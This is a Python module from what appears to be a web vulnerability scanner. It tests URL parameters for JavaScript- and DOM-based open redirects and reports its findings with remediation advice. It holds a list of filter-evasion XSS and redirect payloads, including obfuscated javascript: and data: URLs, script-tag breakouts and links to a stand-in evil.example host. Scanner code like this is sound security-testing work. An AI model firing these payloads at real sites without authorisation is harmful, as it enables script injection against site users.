"""SentinelX module [29]: Open Redirect via JavaScript / DOM.

Real implementation: tests data: and javascript: URLs in redirect params,
detects DOM-based redirects via script reflection analysis. Complements
probe.scan_openredirect (header/meta based).
"""

from __future__ import annotations

import re
from urllib.parse import urlencode as _urlencode

from sentinelx.core.http import ScanClient, ScanConfig
from sentinelx.core.models import Finding, Evidence, raw_request, raw_response


JS_PAYLOADS = [
    # --- TECHNIQUE: javascript: scheme ---
    "javascript:alert(1)",
    "JaVaScRiPt:alert(1)",
    "javascript:alert(1)//",
    "   javascript:alert(1)",
    "javascript&#58;alert(1)",
    # --- TECHNIQUE: data: scheme ---
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "data:text/html,<svg onload=alert(1)>",
    # --- TECHNIQUE: vbscript: (legacy IE) ---
    "vbscript:msgbox(1)",
    # --- TECHNIQUE: scheme confusion ---
    "java\tscript:alert(1)",
    "java\nscript:alert(1)",
    "javascript&colon;alert(1)",
    # --- TECHNIQUE: open redirect to JS execution ---
    "//evil.example/x.js",
    "https://evil.example/x.js",
    # --- TECHNIQUE: DOM sink primitives ---
    "'-alert(1)-'",
    "\"><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    # --- TECHNIQUE: location assignment ---
    "javascript:void(0)",
    "javascript:/*-/*`/*\\`/*'/*\"/**/oNclick=alert(1)//",
    # --- TECHNIQUE: unicode scheme ---
    "\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)",
    # --- TECHNIQUE: meta refresh style ---
    "0;url=javascript:alert(1)",
    # --- TECHNIQUE: whitespace padding ---
    "javascript\n:alert(1)",
    "javascript\r:alert(1)",
    # --- TECHNIQUE: null byte ---
    "javascript\x00:alert(1)",
    # --- TECHNIQUE: HTML5 entities ---
    "javascript&colon;alert&lpar;1&rpar;",
    # --- TECHNIQUE: fragment-only JS ---
    "#javascript:alert(1)",
    # --- TECHNIQUE: double scheme ---
    "javascript:javascript:alert(1)",
    # --- TECHNIQUE: case + tab ---
    "JaVa\tScRiPt:alert(1)",
]

REMEDIATION_JSREDIR = (
    "Validate redirect URLs against an allowlist. Never put user input "
    "directly into JavaScript contexts. Use safe URL parsing."
)


async def scan_endpoint(client: ScanClient, config: ScanConfig,
                        method: str, url: str, params: dict) -> list[Finding]:
    findings: list[Finding] = []
    if not params:
        return findings
    headers = {"User-Agent": config.user_agent}
    redir_params = [p for p in params
                    if re.search(r"url|redirect|next|return|dest|target|continue|ref|goto", p, re.I)]
    targets = redir_params or list(params)[:2]

    for param in targets:
        for payload in JS_PAYLOADS:
            p = dict(params); p[param] = payload
            if method == "GET":
                full = url + ("&" if "?" in url else "?") + _urlencode(p)
                resp = await client.get(full, dedupe=False)
                body_sent = None
            else:
                resp = await client.post(url, data=p, dedupe=False)
                full, body_sent = url, _urlencode(p).encode()
            if not resp:
                continue
            # signal 1: dangerous scheme reflected in JS context
            js_ctx = re.search(
                r"<script[^>]*>.*?(javascript:|data:text/html)",
                resp.text, re.I | re.S)
            # signal 2: assignment to location/href with our payload
            assign = re.search(
                r"(location|href)\s*=\s*['\"]?[^'\"]*(javascript:|data:text/html)",
                resp.text, re.I)
            if js_ctx or assign:
                # confirm
                if method == "GET":
                    r2 = await client.get(full, dedupe=False)
                else:
                    r2 = await client.post(url, data=p, dedupe=False)
                if r2 and (re.search(r"javascript:|data:text/html", r2.text, re.I)):
                    ev = Evidence(
                        request_raw=raw_request(method, full, headers, body_sent),
                        response_raw=raw_response(resp.status_code, dict(resp.headers), resp.content),
                        proof=f"JS/DOM open redirect confirmed (2/2): dangerous scheme '{payload[:20]}' in script context",
                    )
                    findings.append(Finding(
                        type="Open Redirect", subtype="javascript-dom",
                        cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
                        confidence=0.88, url=full, method=method, param=param,
                        payload=payload, evidence=ev, cwe="CWE-601",
                        owasp="A01:2021 – Broken Access Control",
                        remediation=REMEDIATION_JSREDIR,
                        references=["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
                    ))
                    break
        if findings:
            break
    return findings
